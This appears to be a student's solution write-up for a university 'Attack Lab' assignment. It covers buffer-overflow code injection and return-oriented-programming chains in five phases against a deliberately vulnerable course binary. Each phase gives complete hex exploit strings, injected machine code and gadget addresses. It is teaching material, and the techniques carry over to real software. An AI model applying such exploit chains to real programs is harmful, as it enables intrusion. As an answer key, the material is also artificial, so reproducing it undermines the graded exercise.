# Lab3 AttackLab

## Phase 1

No new execution code is needed to be injected. Overflow the buffer to change the return address to the address of `touch1()`

## Phase 2

Inject my cookie to %rdi, which will be the input value of `touch2()`

1. redirect the execution to `%rdi build` function
2. %rdi build function: move my cookie to %rdi
3. redirect the execution to the address of `touch2()`

Byte code for %rdi build function: 

```
48 c7 c7 fa 97 b9 59 c3 /* movq $0x59b997fa, %rdi */
```

Put it together: 

```
48 c7 c7 fa 97 b9 59 c3 /* %rdi build code: move my cookie to %rdi */
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
78 dc 61 55 00 00 00 00 /* address of my %rdi build code */
ec 17 40 00 00 00 00 00 /* address of touch 2 code */
```

## Phase 3

Phase 3 is similar to Phase 2, but we need to move the pointer of cookie string to register %rdi this time.

1. redirect the execution to `%rdi build` function
2. %rdi build function: move the pointer of my cookie to %rdi
    + convert cookie string to hex format
    + put the cookie string before the return address, and calculate the offset to generate the actual address
3. redirect the execution to the address of `touch3()`

```
48 c7 c7 b0 dc 61 55 c3 /* move the cookie string address to %rdi */
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
78 dc 61 55 00 00 00 00 /* address of my %rdi build code */
fa 18 40 00 00 00 00 00 /* address of touch 3 code */
35 39 62 39 39 37 66 61 /* cookie string in hex format */
```

## Phase 4

Phase 4 is also similar to Phase 2, but we cannot inject `%rdi build function` this time. This is because:

+ It `marks the section of memory holding the stack as nonexecutable`, so even if you could set the program counter to the start of your injected code, the program would fail with a segmentation fault.

So, we need to collect some gadgets to move my cookie to %rdi

Luckily, we find these assembly codes, and combine them to generate %rdi build function

```
popq %rax  
nop  
retq
```

```
movq %rax,%rdi
nop
retq
```

1. pop the cookie string to %rax
2. move %rax to %rdi
3. redirect the execution to the address of `touch2()`

```
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
ab 19 40 00 00 00 00 00 /* address of popq %rax  nop  retq */
fa 97 b9 59 00 00 00 00 /* cookie */
a2 19 40 00 00 00 00 00 /* address of movq %rax,%rdi */
ec 17 40 00 00 00 00 00 /* address of touch2 */
```


## Phase 5

Phase 5 is similar to Phase 3, but we cannot calculate the address of cookie string based on the buffer address. This is because:

+ It uses randomization so that the stack positions differ from one run to another. This makes it impossible to determine where your injected code will be located.

The address is unpredictable, so we cannot use the method in Phase 4 to pop the address of my cookie string.

So, we still need to combine some gadgets in the farm function to generate %rdi. This phase is much harder than before. You need to be very familiar with the assembly and byte code to generate a valid function.

I search on Google to find some useful tips to handle this phase. I choose one of them to generate my final answer.

```
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
06 1a 40 00 00 00 00 00 /* movq %rsp,%rax  48 89 e0 c3 */
d8 19 40 00 00 00 00 00 /* add $0x37,%al   04 37 c3 */
a2 19 40 00 00 00 00 00 /* movq %rax,%rdi  48 89 c7 c3 */
fa 18 40 00 00 00 00 00 /* address of touch 3 */
dd dd dd dd dd dd dd dd
dd dd dd dd dd dd dd dd
dd dd dd dd dd dd dd dd
dd dd dd dd dd dd dd    /* Padding (0x37(55)-24=31 in total) */
35 39 62 39 39 37 66 61 /* Cookie in ASCII */
```


